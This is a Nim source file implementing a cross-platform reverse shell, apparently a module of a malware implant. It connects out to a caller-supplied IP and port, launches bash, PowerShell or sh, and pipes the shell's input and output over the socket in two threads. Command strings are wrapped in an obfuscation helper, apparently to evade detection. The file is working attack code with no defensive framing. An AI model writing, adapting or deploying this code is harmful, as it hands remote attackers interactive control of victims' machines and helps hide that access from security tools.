import net
import osproc
import streams

import utils

type
    ShellSendData = tuple
        shellStdOut: Stream
        socket: Socket

    ShellRecvData = tuple
        shellStdIn: Stream
        socket: Socket

proc shellSend(args: ShellSendData) {.thread.} =
    var data: string
    while true:
        try:
            data = args.shellStdOut.readLine()
            args.socket.send(data & "\n")
        except:
            discard

proc shellRecv(args: ShellRecvData) {.thread.} = 
    var data: string
    while true:
        data = args.socket.recvLine()

        if data == "" or data == obf("exit"):
            args.socket.close()
            break

        args.shellStdIn.writeLine(data & "\n")
        args.shellStdIn.flush()

proc startReverseShell*(ip: string, port: int): void =
    var socket = newSocket()
    socket.connect(ip, Port(port))

    var shellProcess: Process

    when defined(linux):
        shellProcess = startProcess(command=obf("/bin/bash"), args=[obf("-i")], options={poStdErrToStdOut})

    when defined(windows):
        shellProcess = startProcess(command=obf("powershell"), options={poStdErrToStdOut})

    when defined(freebsd):
        shellProcess = startProcess(command=obf("/bin/sh"), args=["-i"], options={poStdErrToStdOut})

    var shellStdIn = shellProcess.inputStream
    var shellStdOut = shellProcess.outputStream

    var sendThread: Thread[ShellSendData]
    var recvThread: Thread[ShellRecvData]

    createThread(sendThread, shellSend, (shellStdOut, socket))
    createThread(recvThread, shellRecv, (shellStdIn, socket))
    sendThread.joinThread()
    recvThread.joinThread()

    shellProcess.close()
